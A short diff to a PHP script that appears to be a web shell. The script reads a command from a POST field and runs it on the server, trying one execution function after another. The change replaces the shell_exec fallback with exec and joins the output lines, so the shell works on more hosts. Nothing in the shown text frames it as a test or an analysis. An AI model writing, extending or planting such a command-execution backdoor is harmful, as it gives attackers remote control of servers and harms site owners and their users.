@@ -62,10 +62,11 @@ if (isset( $_POST['command'])):
 			$output = ob_get_contents();
 			ob_end_clean();
 		}
-		// Try: shell_exec
-		else if(function_exists('shell_exec'))
+		// Try: exec
+		else if(function_exists('exec'))
 		{
-			$output = shell_exec($command);
+			exec($command , $output , $return_var);
+			$output = implode("" , $output);
 		}
 		// No function exists
 		else
